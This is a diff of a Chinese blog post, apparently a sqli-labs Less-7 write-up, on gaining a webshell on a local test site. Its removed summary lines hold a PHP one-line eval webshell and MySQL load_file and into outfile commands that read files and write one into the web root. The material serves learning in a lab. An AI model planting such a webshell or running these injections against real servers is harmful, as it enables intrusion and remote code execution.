@@ -347,15 +347,8 @@
 <p>然后用中国菜刀打开<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-7/text.php">http://127.0.0.1/sql/Less-7/text.php</a><br><img src="https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/4.png" alt="4"></p>
 <p>这样就拿到了这个网站的webshell。</p>
 <h1>小结</h1>
-                1.一句话木马：<?php @eval($_POST['pass']);?>（‘pass’是可以任意设置的密码）<br>
-    2.load file() 读取本地文件 select load file('要读取的文件的路径');<br>
-        //select load file('E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt');<br>
-    3.into outfile 写文件 select "要写的内容" into outfile 'text.txt';(这样默认在E:\\PhpStudy2018\\PHPTutorial\\Mysql\\date下生成text.txt)<br>
-        //select "pass" into outfile 'E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7\\text.txt' ;(在E:\\PhpStudy2018\\PHPTutorial\\WWW\\sql\\Less-7下生成text.txt文件)<br>
-
-
-
-
+![5](https://github.com/yzhk/yzhk.github.io/blob/master/2021/02/02/sql-labs-Less-7/5.png)
+这里用图是因为不知道为什么木马的部分显示不出来。。。
 
 
       
